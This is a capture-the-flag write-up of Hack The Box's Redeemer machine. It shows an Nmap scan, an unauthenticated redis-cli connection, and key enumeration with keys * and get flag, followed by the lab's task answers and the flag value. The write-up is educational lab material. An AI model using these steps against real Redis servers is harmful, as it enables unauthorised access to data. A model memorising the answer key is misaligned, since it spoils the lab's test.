---
title: HackTheBox - Redeemer
authors: Samarth
categories: [HackTheBox , Starting Point - Tier 0]
tags: [Linux, Redis, Databases, Vulnerability Assessment, Reconnaissance, Anonymous/Guest Access]
math: true
mermaid: true
---

![Redeemer-HTB](/assets/images/starting-point/Redeemer-HTB/banner.png)

## TL;DR

This writeup is based on the [__Redeemer__](https://app.hackthebox.com/starting-point){:target="_blank"} machine, which is an easy-rated Linux box on Hack the Box. After scanning the target, I found an open Redis port (6379) running Redis version 5.0.7. Redis, being an in-memory key-value store, often lacks authentication in older versions, allowing unauthenticated access. I connected to the Redis server without credentials and used the `keys *` command to list the keys. Among the keys, I found one named `flag` and retrieved its value, which contained the flag for the machine.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports 6379 , corresponding to `redis`. Here are the results from Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn -p- 10.129.12.60 -oN scan/normal.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2025-02-15 17:37 IST
Warning: 10.129.12.60 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.12.60
Host is up (0.22s latency).
Not shown: 65507 closed tcp ports (conn-refused), 27 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

## Enumeration

`Redis (Remote Dictionary Server)` is an open-source, in-memory key-value data store primarily used as a database, cache, and message broker. It is known for its speed and efficiency, as it keeps data in RAM rather than on disk, making read/write operations extremely fast.

The Nmap scan has identified `Redis 5.0.7`, which was released in 2019.
Since Redis frequently updates for security patches and bug fixes, this version is considered outdated and may contain known vulnerabilities.

Older `Redis` versions often lack authentication by default, allowing attackers to connect directly without credentials.

Let's try to connect with redis server without any password.

```bash
redis-cli -h 10.129.12.60
10.129.12.60:6379>
```

Let's run `info` command to know server info.

```bash
10.129.12.60:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:751
run_id:da8476e903beac68d6d48b3cee1a772d995276f6
tcp_port:6379
uptime_in_seconds:5605
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:11572470
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
```

I can list all the key using `keys *`.

```bash
10.129.12.60:6379> keys *
1) "flag"
2) "stor"
3) "numb"
4) "temp"
```

I can see that there is one key named as `flag` which indicates that it can contains flag for this machine.

```bash
10.129.12.60:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

## Tasks

### Which TCP port is open on the machine?

```plaintext
6379
```

### Which service is running on the port that is open on the machine?

```plaintext
redis
```

### What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database

```plaintext
In-memory Datbase
```

### Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.

```plaintext
redis-cli
```

### Which flag is used with the Redis command-line utility to specify the hostname?

```plaintext
-h
```

### Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?

```plaintext
info
```

### What is the version of the Redis server being used on the target machine?

```plaintext
5.0.7
```

### Which command is used to select the desired database in Redis?

```plaintext
select
```

### How many keys are present inside the database with index 0?

```plaintext
4
```

### Which command is used to obtain all the keys in a database?

```plaintext
keys *
```

### Submit root flag

```plaintext
03e1d2b376c37ab3f5319922053953eb
```



